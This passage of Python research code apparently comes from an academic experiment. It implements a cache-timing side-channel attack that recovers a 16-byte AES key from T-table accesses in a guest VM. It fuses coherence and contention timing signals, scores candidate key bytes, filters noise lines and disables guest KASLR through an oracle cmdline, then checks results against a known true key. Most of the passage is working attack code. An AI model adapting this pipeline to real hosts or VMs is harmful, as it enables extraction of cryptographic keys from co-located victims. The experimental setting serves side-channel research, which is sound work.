            phase1_hits = ob.get("phase1_hits")
            phase2_hits = ob.get("phase2_hits")
            phase2_tail_hits = ob.get("phase2_tail_hits")
            p1_hit = isinstance(phase1_hits, set) and pred_global in phase1_hits
            p2_hit = isinstance(phase2_hits, set) and pred_global in phase2_hits
            p2_tail = isinstance(phase2_tail_hits, set) and pred_global in phase2_tail_hits

            # Correlation Attack: 结合timing amplitude和hit信号
            if use_correlation:
                # Phase1: Coherence timing amplitude
                tmap = ob.get("tsc_map")
                phase1_timing = 0.0
                if isinstance(tmap, dict) and pred_global in tmap:
                    phase1_timing = float(tmap.get(pred_global, 0))

                # Phase2: Contention timing amplitude
                phase2_max_lat = ob.get("phase2_max_lat")
                phase2_timing = 0.0
                if isinstance(phase2_max_lat, dict) and pred_global in phase2_max_lat:
                    phase2_timing = float(phase2_max_lat.get(pred_global, 0))

                # Hybrid fusion: 加权组合两个信号
                if fusion_mode == "phase1_only":
                    combined_timing = phase1_timing
                elif fusion_mode == "weighted_fixed":
                    # 固定权重融合
                    w1 = 1.0 - phase2_weight
                    w2 = phase2_weight
                    combined_timing = w1 * phase1_timing + w2 * phase2_timing
                elif fusion_mode == "adaptive":
                    # 自适应权重：根据hit信号调整
                    if p1_hit and p2_hit:
                        # 两个信号都hit，高置信度
                        combined_timing = 0.6 * phase1_timing + 0.4 * phase2_timing
                    elif p1_hit:
                        # 只有coherence hit
                        combined_timing = 0.8 * phase1_timing + 0.2 * phase2_timing
                    elif p2_hit:
                        # 只有contention hit
                        combined_timing = 0.3 * phase1_timing + 0.7 * phase2_timing
                    else:
                        # 都没hit，平均
                        combined_timing = 0.5 * phase1_timing + 0.5 * phase2_timing
                else:
                    # 默认：or融合
                    combined_timing = max(phase1_timing, phase2_timing)

                correlation_sum += combined_timing
                valid += 1

            # 非correlation模式：binary hit计数
            if pred_global in monitored:
                if not use_correlation:
                    valid += 1

                if fusion_mode == "phase1_only":
                    hit = p1_hit
                else:
                    hit = p1_hit or p2_hit
                if hit:
                    hit_count += 1

                if fusion_mode == "phase1_only":
                    fused = 1.0 if p1_hit else 0.0
                elif fusion_mode == "or_binary":
                    fused = 1.0 if (p1_hit or p2_hit) else 0.0
                elif fusion_mode == "weighted_fixed":
                    # 固定权重融合
                    fused = 0.0
                    if p1_hit:
                        fused += (1.0 - phase2_weight)
                    if p2_tail:
                        fused += phase2_tail_weight
                    elif p2_hit:
                        fused += phase2_weight
                else:
                    fused = 1.0 if p1_hit else 0.0
                    if p2_tail:
                        fused += phase2_tail_weight
                    elif p2_hit:
                        fused += phase2_weight
                evidence_sum += fused

                if score_mode == "soft":
                    soft_sum += fused
                    tmap = ob.get("tsc_map")
                    if isinstance(tmap, dict):
                        raw_t = tmap.get(pred_global, 0)
                        t = float(raw_t) if isinstance(raw_t, (int, float)) else 0.0
                        th = float(line_thresholds.get(pred_global, 0.0))
                        soft_sum += max(0.0, (t - th) / max(1.0, th)) * 0.1

        # 计算最终score
        if use_correlation:
            # Hybrid模式：使用timing amplitude的平均值作为score
            score = (correlation_sum / valid) if valid > 0 else 0.0
        elif score_mode == "soft":
            score = (soft_sum / valid) if valid > 0 else 0.0
        else:
            score = (evidence_sum / valid) if valid > 0 else 0.0

        scores.append(
            {
                "k": k,
                "score": score,
                "hit_count": hit_count,
                "valid_count": valid,
                "soft_sum": soft_sum,
                "evidence_sum": evidence_sum,
                "correlation_sum": correlation_sum,
            }
        )

    # 二阶段恢复：先定高4bit，再在该高4bit集合中选低4bit
    best_high_nibble = -1
    if recover_mode == "two_stage_nibble":
        nibble_scores: dict[int, float] = {}
        for hn in range(16):
            subset = [row for row in scores if (int(row["k"]) >> 4) == hn]
            if subset:
                nibble_scores[hn] = max(float(r["score"]) for r in subset)
        if nibble_scores:
            best_high_nibble = max(nibble_scores.items(), key=lambda it: it[1])[0]
            scores.sort(
                key=lambda it: (
                    int((int(it["k"]) >> 4) == best_high_nibble),
                    float(it["score"]),
                    int(it["hit_count"]),
                ),
                reverse=True,
            )
        else:
            scores.sort(key=lambda it: (float(it["score"]), int(it["hit_count"])), reverse=True)
    else:
        scores.sort(key=lambda it: (float(it["score"]), int(it["hit_count"])), reverse=True)
    best = int(scores[0]["k"])
    valid_ref = int(scores[0]["valid_count"])
    covered = bool(valid_ref >= min_valid_count)
    margin = float(scores[0]["score"]) - float(scores[1]["score"]) if len(scores) > 1 else float(scores[0]["score"])
    return {
        "byte_pos": byte_pos,
        "table_idx": table_idx,
        "best_key": best,
        "valid_count": valid_ref,
        "covered": covered,
        "score_margin": margin,
        "best_high_nibble": int((best >> 4) & 0xF),
        "selected_high_nibble": int(best_high_nibble if best_high_nibble >= 0 else ((best >> 4) & 0xF)),
        "score_mode": score_mode,
        "top5": scores[:5],
        "all_scores": scores,
    }


def recover_full_key(
    observations: list[dict[str, object]],
    monitored_lines: list[int],
    te0_gpa: int,
    line_thresholds: dict[int, float],
    fusion_mode: str,
    score_mode: str,
    recover_mode: str,
    template_pattern_bytes: int,
    min_valid_count: int,
    phase2_weight: float = 0.25,
    phase2_tail_weight: float = 0.5,
) -> dict[str, object]:
    monitored = set(monitored_lines)
    recovered: list[int] = []
    per_byte: list[dict[str, object]] = []
    covered_bytes = 0
    margin_sum = 0.0
    high_nibble_correct = 0
    for byte_pos in range(16):
        r = recover_one_byte(
            observations,
            byte_pos=byte_pos,
            monitored=monitored,
            te0_gpa=te0_gpa,
            line_thresholds=line_thresholds,
            fusion_mode=fusion_mode,
            score_mode=score_mode,
            recover_mode=recover_mode,
            template_pattern_bytes=template_pattern_bytes,
            min_valid_count=min_valid_count,
            phase2_weight=phase2_weight,
            phase2_tail_weight=phase2_tail_weight,
        )
        recovered.append(int(r["best_key"]))
        per_byte.append(r)
        if bool(r.get("covered", False)):
            covered_bytes += 1
        margin_sum += float(r.get("score_margin", 0.0))
        if ((int(r["best_key"]) >> 4) & 0xF) == ((TRUE_AES_KEY[byte_pos] >> 4) & 0xF):
            high_nibble_correct += 1
    recovered_bytes = bytes(recovered)
    correct = sum(1 for i in range(16) if recovered_bytes[i] == TRUE_AES_KEY[i])
    return {
        "recovered_key_hex": recovered_bytes.hex(),
        "true_key_hex": TRUE_AES_KEY.hex(),
        "byte_correct": correct,
        "byte_accuracy": correct / 16.0,
        "high_nibble_correct": high_nibble_correct,
        "high_nibble_accuracy": high_nibble_correct / 16.0,
        "full_key_success": recovered_bytes == TRUE_AES_KEY,
        "covered_bytes": covered_bytes,
        "covered_ratio": covered_bytes / 16.0,
        "avg_score_margin": margin_sum / 16.0,
        "per_byte": per_byte,
    }


def write_single_byte_scores(path: Path, one_byte_result: dict[str, object]) -> None:
    with path.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(["rank", "k", "score", "hit_count", "valid_count", "soft_sum", "evidence_sum", "correlation_sum"])
        for i, row in enumerate(one_byte_result["all_scores"], start=1):
            wr.writerow(
                [
                    i,
                    int(row["k"]),
                    f"{float(row['score']):.9f}",
                    int(row["hit_count"]),
                    int(row["valid_count"]),
                    f"{float(row.get('soft_sum', 0.0)):.6f}",
                    f"{float(row.get('evidence_sum', 0.0)):.6f}",
                    f"{float(row.get('correlation_sum', 0.0)):.6f}",
                ]
            )


def write_full_key_scores(path: Path, full_result: dict[str, object]) -> None:
    with path.open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(["byte_pos", "rank", "k", "score", "hit_count", "valid_count", "soft_sum", "evidence_sum", "correlation_sum"])
        for by in full_result["per_byte"]:
            byte_pos = int(by["byte_pos"])
            for i, row in enumerate(by["all_scores"], start=1):
                wr.writerow(
                    [
                        byte_pos,
                        i,
                        int(row["k"]),
                        f"{float(row['score']):.9f}",
                        int(row["hit_count"]),
                        int(row["valid_count"]),
                        f"{float(row.get('soft_sum', 0.0)):.6f}",
                        f"{float(row.get('evidence_sum', 0.0)):.6f}",
                        f"{float(row.get('correlation_sum', 0.0)):.6f}",
                    ]
                )


def parse_checkpoints(raw: str) -> list[int]:
    vals: list[int] = []
    for x in raw.split(","):
        x = x.strip()
        if not x:
            continue
        vals.append(int(x))
    vals = sorted(set(v for v in vals if v > 0))
    return vals


def parse_name_list(raw: str) -> list[str]:
    out: list[str] = []
    for x in str(raw).split(","):
        x = x.strip()
        if x:
            out.append(x)
    return out


def parse_noise_lines(raw: str) -> set[int]:
    out: set[int] = set()
    for x in str(raw).split(","):
        x = x.strip()
        if not x:
            continue
        try:
            out.add(int(x))
        except ValueError:
            continue
    return out


def derive_adaptive_noise_lines(
    observations: list[dict[str, object]],
    candidate_lines: list[int],
    base_noise: set[int],
    *,
    phase: str = "phase1_hits",
    hit_rate_threshold: float = 0.90,
    min_samples: int = 32,
) -> set[int]:
    noise = set(int(x) for x in base_noise)
    if len(observations) < min_samples:
        return noise

    counts: dict[int, int] = {int(line): 0 for line in candidate_lines}
    total = 0
    for ob in observations:
      hits = ob.get(phase)
      if not isinstance(hits, set):
        continue
      total += 1
      for line in hits:
        il = int(line)
        if il in counts:
          counts[il] += 1

    if total < min_samples:
        return noise

    for line, cnt in counts.items():
        if float(cnt) / float(total) >= hit_rate_threshold:
            noise.add(int(line))
    return noise


def filter_observations_noise(
    observations: list[dict[str, object]],
    noise_lines: set[int],
) -> list[dict[str, object]]:
    out: list[dict[str, object]] = []
    noise = set(int(x) for x in noise_lines)
    for ob in observations:
        row = dict(ob)
        for key in ["hit_lines", "phase1_hits", "phase2_hits", "phase2_tail_hits"]:
            val = row.get(key)
            if isinstance(val, set):
                row[key] = {int(x) for x in val if int(x) not in noise}
        tmap = row.get("tsc_map")
        if isinstance(tmap, dict):
            row["tsc_map"] = {int(k): int(v) for k, v in tmap.items() if int(k) not in noise}
        p2 = row.get("phase2_max_lat")
        if isinstance(p2, dict):
            row["phase2_max_lat"] = {int(k): int(v) for k, v in p2.items() if int(k) not in noise}
        table_part_counts = row.get("table_part_counts")
        if isinstance(table_part_counts, dict):
            # Keep as-is; counts are already aggregate features and not line keyed.
            row["table_part_counts"] = {
                int(k): [int(v[0]), int(v[1])] for k, v in table_part_counts.items()
            }
        out.append(row)
    return out


def recovery_pipeline(
    vm_ctl: NptCtlClient,
    te0_gpa: int,
    line_rows: list[dict[str, float | int]],
    args: argparse.Namespace,
    outdir: Path,
) -> dict[str, object]:
    rec_dir = outdir / "key_recovery"
    rec_dir.mkdir(parents=True, exist_ok=True)

    k_sets, table_ranked = build_table_topk_sets(line_rows)
    top_all = k_sets["top_all"]
    te0_start_line, te0_end_line = table_line_range(te0_gpa, 0)
    te0_rows = table_ranked.get(0, [])
    if not te0_rows:
        te0_rows = sorted(line_rows, key=line_score, reverse=True)
    te0_best = int(max(te0_rows, key=lambda it: float(line_score(it)))["line"])
    line_thresholds = build_line_thresholds(line_rows, args.theta_mode, args.theta, args.theta_scale)
    resolved_theta_global = float(statistics.median(line_thresholds.values())) if line_thresholds else 0.0
    requested_obs_k = str(args.observation_kset).strip()
    if requested_obs_k not in k_sets or not k_sets.get(requested_obs_k):
        requested_obs_k = "top4" if k_sets.get("top4") else "top_all"
    observation_lines = list(k_sets.get(requested_obs_k, top_all))

    requested_eval = parse_name_list(args.evaluate_ksets)
    eval_names: list[str] = []
    for name in requested_eval:
        if name in k_sets and k_sets.get(name):
            if name not in eval_names:
                eval_names.append(name)
    if not eval_names:
        eval_names = [requested_obs_k]

    noise_lines = parse_noise_lines(args.noise_lines)
    if not noise_lines:
        noise_lines = set(DEFAULT_NOISE_LINES)

    contention_cfg: dict[str, float | int] = {
        "offset_us": float(args.contention_offset_us),
        "sigma_us": float(args.contention_sigma_us),
        "hits": 0,
        "trials": 0,
        "theta_contention": int(args.theta_contention),
        "theta_contention_tail": int(args.theta_contention_tail),
        "mode": "disabled",
    }
    if bool(args.enable_contention):
        contention_cfg = calibrate_contention_window(
            vm_ctl=vm_ctl,
            args=args,
            target_gpa=line_to_gpa(te0_gpa, te0_best),
        )
        if int(args.theta_contention) > 0 and int(args.theta_contention_tail) > 0:
            contention_cfg.update(
                {
                    "theta_contention": int(args.theta_contention),
                    "theta_contention_tail": int(args.theta_contention_tail),
                    "mode": "manual",
                    "baseline_median": 0.0,
                    "trigger_median": 0.0,
                    "window_start_us": max(0.0, float(contention_cfg.get("offset_us", 0.0))),
                    "window_end_us": max(
                        0.0,
                        float(contention_cfg.get("offset_us", 0.0))
                        + max(float(args.contention_min_window_us), 1.0),
                    ),
                }
            )
        else:
            contention_th = calibrate_contention_thresholds(
                vm_ctl=vm_ctl,
                args=args,
                target_gpa=line_to_gpa(te0_gpa, te0_best),
                offset_us=float(contention_cfg.get("offset_us", 0.0)),
                sigma_us=float(contention_cfg.get("sigma_us", 0.0)),
            )
            contention_cfg.update(contention_th)
            contention_cfg["mode"] = "adaptive"

    # correlation 模式下支持两种明文策略：
    # random: 全随机已知明文（更适合全16字节联合恢复）
    # fixed_byte: 固定一个字节做强模板（更适合单字节PoC）
    plaintexts_to_use = None
    if args.disaligned_attack:
        # Disaligned攻击模式：只为正确密钥生成特殊明文
        target_entries = [int(x.strip()) for x in args.disaligned_target_entries.split(",")]
        samples_per_target = args.disaligned_samples_per_target
        actual_samples = len(target_entries) * samples_per_target

        plaintexts_to_use = generate_controlled_plaintexts(
            target_byte_pos=args.poc_byte_pos,
            samples_per_value=0,  # Not used in disaligned mode
            total_samples=0,  # Not used in disaligned mode
            disaligned_mode=True,
            disaligned_samples_per_target=samples_per_target,
            disaligned_target_entries=target_entries,
        )
        print(
            f"[disaligned] 使用 disaligned 攻击模式: "
            f"byte_pos={args.poc_byte_pos}, target_entries={target_entries}, "
            f"samples_per_target={samples_per_target}, total_samples={actual_samples}"
        )
        args.samples = actual_samples

    elif args.score_mode == "correlation" and str(args.correlation_plaintext_mode) == "fixed_byte":
        samples_per_value = max(1, args.samples // 256)
        actual_samples = samples_per_value * 256
        if actual_samples != args.samples:
            print(f"[correlation] 警告: 调整样本数从 {args.samples} 到 {actual_samples} (256的倍数)")
            args.samples = actual_samples

        plaintexts_to_use = generate_controlled_plaintexts(
            target_byte_pos=args.poc_byte_pos,
            samples_per_value=samples_per_value,
            total_samples=actual_samples,
        )
        print(
            "[correlation] 使用 fixed_byte 明文策略: "
            f"byte_pos={args.poc_byte_pos}, samples_per_value={samples_per_value}, total_samples={actual_samples}"
        )

    obs_pack = collect_observations(
        vm_ctl=vm_ctl,
        te0_gpa=te0_gpa,
        args=args,
        samples=args.samples,
        monitored_lines=observation_lines,
        phase2_lines=observation_lines,
        line_thresholds=line_thresholds,
        contention_cfg=contention_cfg,
        fusion_mode=args.fusion_mode,
        noise_lines=noise_lines,
        template_pattern_bytes=args.template_pattern_bytes,
        out_csv=rec_dir / "observations_53.csv",
        plaintexts=plaintexts_to_use,
    )
    observations = list(obs_pack["observations"])

    adaptive_noise_lines = derive_adaptive_noise_lines(
        observations,
        candidate_lines=observation_lines,
        base_noise=noise_lines,
        phase="phase1_hits",
        hit_rate_threshold=0.90,
        min_samples=max(32, min(128, int(args.samples) // 2 if int(args.samples) > 0 else 32)),
    )
    if adaptive_noise_lines != noise_lines:
        removed = sorted(adaptive_noise_lines - noise_lines)
        if removed:
            print(f"[recovery] adaptive phase1 noise lines filtered: {removed}")
        noise_lines = adaptive_noise_lines
        observation_lines = [line for line in observation_lines if line not in noise_lines]
        observations = filter_observations_noise(observations, noise_lines)
    te0_best_effective = te0_best
    if te0_best_effective in noise_lines:
        for row in te0_rows:
            cand = int(row["line"])
            if cand not in noise_lines:
                te0_best_effective = cand
                break

    poc = recover_one_byte(
        observations,
        byte_pos=args.poc_byte_pos,
        monitored={te0_best_effective},
        te0_gpa=te0_gpa,
        line_thresholds=line_thresholds,
        fusion_mode=args.fusion_mode,
        score_mode=args.score_mode,
        recover_mode=args.recover_mode,
        template_pattern_bytes=args.template_pattern_bytes,
        min_valid_count=args.min_valid_per_byte,
    )
    write_single_byte_scores(rec_dir / f"single_byte_scores_b{args.poc_byte_pos:02d}.csv", poc)
    poc_correct = int(poc["best_key"]) == TRUE_AES_KEY[args.poc_byte_pos]

    by_k: dict[str, dict[str, object]] = {}
    for name in eval_names:
        lines = k_sets.get(name, [])
        if not lines:
            continue
        res = recover_full_key(
            observations,
            lines,
            te0_gpa=te0_gpa,
            line_thresholds=line_thresholds,
            fusion_mode=args.fusion_mode,
            score_mode=args.score_mode,
            recover_mode=args.recover_mode,
            template_pattern_bytes=args.template_pattern_bytes,
            min_valid_count=args.min_valid_per_byte,
            phase2_weight=args.phase2_weight,
            phase2_tail_weight=args.phase2_tail_weight,
        )
        by_k[name] = res
        write_full_key_scores(rec_dir / f"full_key_scores_{name}.csv", res)
    if not by_k:
        raise RuntimeError("no valid K-set produced recovery results")

    best_name = max(
        by_k.keys(),
        key=lambda name: (
            float(by_k[name]["high_nibble_accuracy"]),
            float(by_k[name]["byte_accuracy"]),
            float(by_k[name]["covered_ratio"]),
            float(by_k[name]["avg_score_margin"]),
            int(by_k[name]["full_key_success"]),
        ),
    )
    checkpoints = parse_checkpoints(args.checkpoints)
    conv_rows: list[dict[str, object]] = []
    for n in checkpoints:
        if n > len(observations):
            continue
        sub = observations[:n]
        sub_res = recover_full_key(
            sub,
            k_sets[best_name],
            te0_gpa=te0_gpa,
            line_thresholds=line_thresholds,
            fusion_mode=args.fusion_mode,
            score_mode=args.score_mode,
            recover_mode=args.recover_mode,
            template_pattern_bytes=args.template_pattern_bytes,
            min_valid_count=args.min_valid_per_byte,
            phase2_weight=args.phase2_weight,
            phase2_tail_weight=args.phase2_tail_weight,
        )
        conv_rows.append(
            {
                "samples": n,
                "high_nibble_accuracy": float(sub_res["high_nibble_accuracy"]),
                "byte_accuracy": float(sub_res["byte_accuracy"]),
                "full_key_success": int(bool(sub_res["full_key_success"])),
            }
        )

    with (rec_dir / "convergence_53.csv").open("w", newline="") as fp:
        wr = csv.writer(fp)
        wr.writerow(["samples", "high_nibble_accuracy", "byte_accuracy", "full_key_success"])
        for r in conv_rows:
            wr.writerow(
                [
                    r["samples"],
                    f"{r['high_nibble_accuracy']:.6f}",
                    f"{r['byte_accuracy']:.6f}",
                    r["full_key_success"],
                ]
            )

    out = {
        "poc_byte_pos": args.poc_byte_pos,
        "poc_best_key": int(poc["best_key"]),
        "poc_correct": bool(poc_correct),
        "te0_best_line": te0_best_effective,
        "top_sets": dict(k_sets) | {"te0_line_range": [te0_start_line, te0_end_line]},
        "observation_stats": {
            "samples_target": int(args.samples),
            "samples_kept": int(obs_pack["samples_kept"]),
            "samples_attempted": int(obs_pack["samples_attempted"]),
            "dropped_by_hitcount": int(obs_pack["dropped_by_hitcount"]),
            "max_attempts": int(obs_pack["max_attempts"]),
            "trigger_repeat_per_sample": int(args.trigger_repeat_per_sample),
            "score_mode": str(args.score_mode),
            "recover_mode": str(args.recover_mode),
            "fusion_mode": str(args.fusion_mode),
            "template_pattern_bytes": int(args.template_pattern_bytes),
            "correlation_plaintext_mode": str(args.correlation_plaintext_mode),
            "observation_kset": str(requested_obs_k),
            "evaluate_ksets": list(eval_names),
            "observation_lines": [int(x) for x in observation_lines],
            "noise_lines": sorted(int(x) for x in noise_lines),
            "phase2_weight": PHASE2_WEIGHT,
            "phase2_tail_weight": PHASE2_TAIL_WEIGHT,
            "theta_mode": str(args.theta_mode),
            "theta_global_resolved": float(resolved_theta_global),
            "contention_enabled": int(obs_pack["contention_enabled"]),
            "theta_contention": int(obs_pack["theta_contention"]),
            "theta_contention_tail": int(obs_pack["theta_contention_tail"]),
            "contention_offset_us": float(obs_pack["contention_offset_us"]),
            "contention_sigma_us": float(obs_pack["contention_sigma_us"]),
            "contention_window_start_us": float(obs_pack["contention_window_start_us"]),
            "contention_window_end_us": float(obs_pack["contention_window_end_us"]),
            "contention_probe_rounds": int(obs_pack["contention_probe_rounds"]),
            "contention_calib_hits": int(contention_cfg.get("hits", 0)),
            "contention_calib_trials": int(contention_cfg.get("trials", 0)),
            "contention_threshold_mode": str(contention_cfg.get("mode", "manual")),
            "contention_base_median": float(contention_cfg.get("baseline_median", 0.0)),
            "contention_trigger_median": float(contention_cfg.get("trigger_median", 0.0)),
            "phase1_total_hits": int(obs_pack["phase1_total_hits"]),
            "phase2_total_hits": int(obs_pack["phase2_total_hits"]),
            "phase2_tail_total_hits": int(obs_pack["phase2_tail_total_hits"]),
            "preheat_reads": int(PREHEAT_READS),
            "scan_order": "randomized",
            "center_stat": "median",
            "line_score_model": "snr_separation_confidence_single_table",
        },
        "results_by_k": {
            name: {
                "recovered_key_hex": str(by_k[name]["recovered_key_hex"]),
                "high_nibble_accuracy": float(by_k[name]["high_nibble_accuracy"]),
                "byte_accuracy": float(by_k[name]["byte_accuracy"]),
                "full_key_success": bool(by_k[name]["full_key_success"]),
                "covered_ratio": float(by_k[name]["covered_ratio"]),
                "avg_score_margin": float(by_k[name]["avg_score_margin"]),
            }
            for name in by_k.keys()
        },
        "best_k": best_name,
        "best_result": {
            "recovered_key_hex": str(by_k[best_name]["recovered_key_hex"]),
            "true_key_hex": str(by_k[best_name]["true_key_hex"]),
            "high_nibble_accuracy": float(by_k[best_name]["high_nibble_accuracy"]),
            "high_nibble_correct": int(by_k[best_name]["high_nibble_correct"]),
            "byte_accuracy": float(by_k[best_name]["byte_accuracy"]),
            "full_key_success": bool(by_k[best_name]["full_key_success"]),
            "byte_correct": int(by_k[best_name]["byte_correct"]),
        },
        "convergence": conv_rows,
    }
    write_json(rec_dir / "recovery_summary_53.json", out)
    return out


def load_scan_range(args: argparse.Namespace) -> tuple[int, int, int]:
    te0_inpage_offset = 0
    if args.suspected_range_json:
        path = Path(args.suspected_range_json)
        if not path.exists():
            raise SystemExit(f"[range] suspected-range-json not found: {path}")
        obj = json.loads(path.read_text())
        if args.scan_start_gpa:
            start = parse_u64(args.scan_start_gpa)
        else:
            start = parse_u64(str(obj["suspected_scan_start_gpa"]))
        if args.scan_end_gpa:
            end = parse_u64(args.scan_end_gpa)
        else:
            end = parse_u64(str(obj["suspected_scan_end_gpa"]))

        if args.te0_inpage_offset:
            te0_inpage_offset = parse_u64(args.te0_inpage_offset) & (PAGE_SZ - 1)
        elif "te0_inpage_offset" in obj:
            te0_inpage_offset = parse_u64(str(obj["te0_inpage_offset"])) & (PAGE_SZ - 1)
        else:
            raise SystemExit(
                "[range] te0_inpage_offset missing in JSON; provide --te0-inpage-offset "
                "or set te0_inpage_offset in --suspected-range-json"
            )
        return start & ~(PAGE_SZ - 1), end & ~(PAGE_SZ - 1), te0_inpage_offset

    if not args.scan_start_gpa or not args.scan_end_gpa:
        raise SystemExit(
            "[range] provide either --suspected-range-json or both --scan-start-gpa/--scan-end-gpa"
        )
    if args.te0_inpage_offset:
        te0_inpage_offset = parse_u64(args.te0_inpage_offset) & (PAGE_SZ - 1)
    else:
        raise SystemExit("[range] --te0-inpage-offset is required when JSON is not provided")
    return (
        parse_u64(args.scan_start_gpa) & ~(PAGE_SZ - 1),
        parse_u64(args.scan_end_gpa) & ~(PAGE_SZ - 1),
        te0_inpage_offset,
    )


def maybe_sync_oracle_from_range_json(args: argparse.Namespace) -> None:
    """
    自动从suspected-range JSON生成guest cmdline参数

    如果提供了--suspected-range-json:
    1. 自动添加nokaslr norandmaps（如果未指定）
    2. 自动添加oracle参数（从JSON读取te0信息）
    """
    path_s = str(getattr(args, "suspected_range_json", "") or "").strip()
    if not path_s:
        # 没有提供JSON，保持原有cmdline
        return

    path = Path(path_s)
    if not path.exists():
        print(f"[oracle] Warning: suspected-range-json not found: {path}")
        return

    try:
        obj = json.loads(path.read_text())
    except Exception as e:
        print(f"[oracle] Warning: failed to parse JSON: {e}")
        return

    # 读取te0信息
    vma_raw = obj.get("te0_symbol_vma")
    off_raw = obj.get("te0_inpage_offset")

    if vma_raw is None or off_raw is None:
        print(f"[oracle] Warning: te0_symbol_vma or te0_inpage_offset missing in JSON")
        return

    try:
        te0_vma = parse_u64(str(vma_raw))
        te0_off = parse_u64(str(off_raw)) & (PAGE_SZ - 1)
    except Exception as e:
        print(f"[oracle] Warning: failed to parse te0 values: {e}")
        return

    # 获取当前cmdline
    raw = str(getattr(args, "guest_extra_cmdline", "") or "").strip()

    # 如果用户没有指定cmdline，使用JSON中的默认值
    if not raw:
        json_cmdline = obj.get("guest_cmdline_extra", "").strip()
        if json_cmdline:
            raw = json_cmdline

    # 解析现有tokens
    tokens = [t for t in raw.split() if t] if raw else []

    # 移除旧的oracle参数
    kept = []
    for t in tokens:
        if t.startswith("oracle_te0"):
            continue
        kept.append(t)

    # 确保有nokaslr和norandmaps
    if "nokaslr" not in kept:
        kept.insert(0, "nokaslr")
    if "norandmaps" not in kept:
        kept.insert(1, "norandmaps")

    # 添加oracle参数
    kept.append("oracle_te0=1")
    kept.append(f"oracle_te0_vma=0x{te0_vma:x}")
    kept.append(f"oracle_te0_off=0x{te0_off:x}")

    # 更新cmdline
    new_cmdline = " ".join(kept)
    args.guest_extra_cmdline = new_cmdline

    print(f"[oracle] Auto-generated guest cmdline from JSON:")
    print(f"[oracle]   {new_cmdline}")


def maybe_override_force_from_boot_oracle(args: argparse.Namespace, vm_dir: Path) -> None:
    """
    If the current boot printed victim_aes_oracle, prefer that runtime GPA over
    stale JSON ranges. This only overrides auto-derived force targets, never
    explicit CLI --force-te0-gpa/--force-te-page-gpa.
    """
    if str(getattr(args, "force_te0_gpa", "") or "").strip():
        return
    if str(getattr(args, "force_te_page_gpa", "") or "").strip():
        return
    if not str(getattr(args, "suspected_range_json", "") or "").strip():
        return

    qemu_console = vm_dir / "qemu_console.log"
    if not qemu_console.exists():
        return
    try:
        text = qemu_console.read_text(errors="replace")
    except OSError:
        return
    matches = BOOT_ORACLE_RE.findall(text)
    if not matches:
        print(f"[oracle] Warning: boot oracle line not found in {qemu_console}")
        return

    te0_gpa_s, te0_page_gpa_s = matches[-1]
    te0_gpa = int(te0_gpa_s, 16)
    te0_page_gpa = int(te0_page_gpa_s, 16) & ~(PAGE_SZ - 1)
    args.force_te0_gpa = f"0x{te0_gpa:x}"
    args.force_te_page_gpa = f"0x{te0_page_gpa:x}"
    print(
        "[oracle] Boot oracle override: "
        f"force_te0_gpa=0x{te0_gpa:x} force_te_page_gpa=0x{te0_page_gpa:x}"
    )


def parse_args() -> argparse.Namespace:
    ap = argparse.ArgumentParser(description="Experiment 5.3: end-to-end AES T-Table recovery pipeline")
    ap.add_argument("--outdir", default="")
    ap.add_argument("--skip-build", action="store_true")

    ap.add_argument("--suspected-range-json", default="")
    ap.add_argument("--scan-start-gpa", default="")
    ap.add_argument("--scan-end-gpa", default="")
    ap.add_argument("--te0-inpage-offset", default="")
    ap.add_argument(
        "--force-te-page-gpa",
        default="",
        help="Bypass discovery and force target Te0 page GPA (page-aligned).",
    )
    ap.add_argument(
        "--force-te0-gpa",
        default="",
        help="Bypass discovery and force exact Te0 GPA (takes priority over --force-te-page-gpa).",
    )

    ap.add_argument("--discover-only", action="store_true")
    ap.add_argument("--discover-rounds", type=int, default=12)
    ap.add_argument("--trigger-requests-per-round", type=int, default=16)
    ap.add_argument("--baseline-wait-ms", type=int, default=5)
    ap.add_argument("--confirm-pages", type=int, default=8)
    ap.add_argument("--confirm-line-reps", type=int, default=4)

    ap.add_argument("--line-reps", type=int, default=32)
    ap.add_argument(
        "--theta",
        type=int,
        default=0,
        help="Global fallback theta; <=0 means adaptive (recommended)",
    )
    ap.add_argument(
        "--theta-mode",
        choices=["global", "line_mid", "line_scaled", "line_sigma"],
        default="line_mid",
        help="优化：使用line_mid模式，取H0和H1的中点作为阈值"
    )
    ap.add_argument("--theta-scale", type=float, default=0.5,
                    help="优化：theta_scale保持0.5，配合line_mid模式")
    ap.add_argument("--score-mode", choices=["binary", "soft", "correlation"], default="correlation")
    ap.add_argument(
        "--recover-mode",
        choices=["direct", "two_stage_nibble"],
        default="two_stage_nibble",
        help="Recovery policy: direct full-byte or two-stage high-nibble then low-nibble.",
    )
    ap.add_argument(
        "--template-pattern-bytes",
        type=int,
        default=DEFAULT_TEMPLATE_PATTERN_BYTES,
        help="Template partition granularity for correlation attack (256 or 512 are typical).",
    )
    ap.add_argument(
        "--correlation-plaintext-mode",
        choices=["random", "fixed_byte"],
        default="random",
        help="Plaintext strategy used only when score-mode=correlation.",
    )
    ap.add_argument(
        "--fusion-mode",
        choices=["phase1_only", "weighted_fixed", "or_binary"],
        default=DEFAULT_FUSION_MODE,
        help="How phase1/phase2 hits are fused into key-score evidence.",
    )
    ap.add_argument(
        "--observation-kset",
        choices=["top1", "top2", "top3", "top4", "top5", "top8", "top64", "top_all"],
        default="top4",
        help="Which line set to monitor while collecting observations.",
    )
    ap.add_argument(
        "--evaluate-ksets",
        default="top1,top2,top3,top4",
        help="Comma-separated K-sets to evaluate in recovery stage.",
    )
    ap.add_argument(
        "--noise-lines",
        default="3,4",
        help="Comma-separated line ids filtered out as always-hit background noise.",
    )
    ap.add_argument("--trigger-repeat-per-sample", type=int, default=4)
    ap.add_argument("--min-hit-lines", type=int, default=1)
    ap.add_argument("--max-hit-lines", type=int, default=0)
    ap.add_argument("--sample-max-attempt-factor", type=float, default=4.0)
    ap.add_argument("--enable-contention", dest="enable_contention", action="store_true")
    ap.add_argument("--disable-contention", dest="enable_contention", action="store_false")
    ap.set_defaults(enable_contention=True)
    ap.add_argument(
        "--theta-contention",
        type=int,
        default=0,
        help="Phase2 contention threshold; <=0 means adaptive",
    )
    ap.add_argument(
        "--theta-contention-tail",
        type=int,
        default=0,
        help="Phase2 contention tail threshold; <=0 means adaptive",
    )
    ap.add_argument("--contention-calib-trials", type=int, default=64)
    ap.add_argument("--contention-offset-us", type=float, default=0.0)
    ap.add_argument("--contention-sigma-us", type=float, default=0.0)
    ap.add_argument("--contention-window-sigma", type=float, default=2.0)
